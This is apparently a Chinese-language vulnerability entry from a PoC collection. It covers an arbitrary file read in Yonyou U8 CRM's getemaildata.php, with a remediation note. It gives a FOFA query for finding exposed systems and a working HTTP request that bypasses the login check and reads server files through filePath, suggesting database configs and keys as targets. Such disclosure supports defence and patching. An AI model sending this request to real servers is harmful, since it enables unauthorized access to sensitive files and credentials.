---
fofa: "body=\"用友U8CRM\""
source: "OA-EXPTOOL/Lucifer1993"
---

# 用友 U8 CRM getemaildata.php 任意文件读取漏洞

# 漏洞描述

用友 U8 CRM 客户关系管理系统 /ajax/getemaildata.php 接口存在任意文件读取漏洞。攻击者通过 DontCheckLogin=1 绕过登录检查，利用 filePath 参数读取服务器上的敏感文件。

注：本条目与仓库已有条目《用友 U8 CRM客户关系管理系统任意文件读取漏洞》（/pub/help2.php 接口）为不同接口，互不覆盖。

# 影响版本

用友 U8 CRM 客户关系管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：body="用友U8CRM"

POC/EXP：

```
GET /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

响应中返回目标文件内容，可替换 filePath 读取其他敏感文件（如数据库配置、密钥文件等）。

# 漏洞修复

联系用友官方获取安全补丁，修复登录检查绕过问题，对 filePath 参数做严格白名单校验。
